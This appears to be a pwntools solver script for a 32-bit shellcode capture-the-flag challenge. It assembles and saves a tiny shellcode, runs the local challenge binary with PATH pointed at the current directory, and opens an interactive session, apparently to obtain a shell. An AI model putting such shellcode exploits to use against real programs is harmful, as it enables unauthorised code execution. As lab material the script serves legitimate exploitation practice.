from pwn import *

DEBUG = False

shellcode = asm('''
    push 0x3b
    pop eax
    push 0x7a
    mov ebp, esp
    int 0x80
''')

print(disasm(shellcode))

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)

if DEBUG:
    io = gdb.debug('./', gdbscript='''
b *0x08048abd
continue
''')
else:
    io = process("short-shellcode-32", env={"PATH":"."})

io.interactive()
